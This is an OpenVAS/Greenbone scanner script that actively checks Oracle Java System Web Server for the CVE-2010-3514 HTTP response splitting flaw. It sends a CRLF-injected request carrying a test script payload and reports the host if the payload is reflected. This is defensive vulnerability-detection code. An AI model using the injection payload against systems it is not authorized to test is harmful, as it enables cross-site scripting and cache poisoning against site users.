# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801532");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2010-3514");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Oracle Java System Web Server HTTP Response Splitting Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("SunWWW/banner");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Oracle Java System Web Server is prone to an HTTP response
  splitting vulnerability.");

  script_tag(name:"insight", value:"The flaw is due to input validation error in the
  'response.setHeader()' method which is not properly sanitising before being returned to the user.
  This can be exploited to insert arbitrary HTTP headers, which will be included in a response sent
  to the user.");

  script_tag(name:"affected", value:"Oracle Java System Web Server 6.x/7.x.");

  script_tag(name:"solution", value:"Apply the referenced vendor update.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to conduct a
  cross-site scripting (XSS) and browser cache poisoning attacks.");

  script_xref(name:"URL", value:"http://inj3ct0r.com/exploits/14530");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15290/");
  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/topics/security/cpuoct2010-175626.html#AppendixSUNS");
  script_xref(name:"URL", value:"http://sunsolve.sun.com/search/document.do?assetkey=1-79-1215353.1-1");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if (!banner || "Server: Sun-" >!< banner)
  exit(0);

host = http_host_name(port: port);

foreach files (make_list("login.jsp", "index.jsp", "default.jsp", "admin.jsp")) {

  url = "/" + files + "?ref=http://" + host +
        "/%0D%0AContent-type:+text/html;%0D%0A%0D%0ATEST%3Cscript%3Ealert(111)%3C/script%3E";

  req = http_get(item: url, port: port);
  res = http_send_recv(port: port, data: req);

  if (egrep(string: res, pattern:"^HTTP/1\.[01] 200") && "TEST<script>alert(111)</script>" >< res) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
